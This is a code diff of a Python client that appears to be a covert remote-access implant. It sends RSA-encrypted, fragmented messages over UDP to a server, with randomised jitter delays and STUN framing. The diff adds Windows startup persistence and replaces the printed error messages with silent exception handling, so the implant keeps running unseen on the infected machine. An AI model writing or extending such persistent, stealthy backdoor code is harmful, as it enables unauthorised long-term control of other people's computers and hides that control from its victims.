@@ -3,7 +3,7 @@ from decryption import decrypt_message
 from message_fragmentation import fragment_message
 from stun import build_stun_message
 import socket, time, random, base64, struct, subprocess, gc, rsa
-
+from add_to_startup import add_to_windows_startup
 
 my_priv_key = None
 my_pub_key = None
@@ -24,11 +24,15 @@ def parse_public_key(text: str):
     except:
         return None
 
+if IS_ADDED_TO_STARTUP == False:
+    if add_to_windows_startup() == 200:
+        IS_ADDED_TO_STARTUP = True
+
 def send_msg(message):
     if type(message) is not str:
         message = str(message)
     try:
-        if target_pub_key:
+        if target_pub_key and not message.startswith("PublicKey("):
             message = encrypt_message(message, target_pub_key)["message"]
             message = base64.b64encode(message.encode()).decode()
         chunks = fragment_message(message, CHUNK_SIZE)
@@ -37,8 +41,7 @@ def send_msg(message):
             jitter_delay = 0.3 + random.uniform(-0.3, 0.3)
             time.sleep(jitter_delay)
             sock.sendto(chunk, SERVER)
-    except Exception as e:
-        print(e)
+    except:
         return
 
 def core():
@@ -138,6 +141,6 @@ def core():
 
             except socket.timeout:
                 break
-            except Exception as e:
-                print(e)
+            except:
+                pass
 core()
